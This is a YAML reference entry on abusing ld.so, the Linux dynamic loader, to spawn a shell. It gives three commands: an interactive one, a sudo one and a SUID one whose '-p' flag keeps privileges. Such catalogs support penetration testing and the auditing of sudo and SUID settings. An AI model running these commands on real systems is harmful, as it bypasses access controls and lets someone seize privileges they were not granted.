---
description: Ld.so is the Linux dynamic linker/loader. Its file name and location might change between Linux versions.
functions:
  exec-interactive:
    - code: /lib/ld.so /bin/sh
  sudo-enabled:
    - code: sudo /lib/ld.so /bin/sh
  suid-enabled:
    - code: ./ld.so /bin/sh -p
---
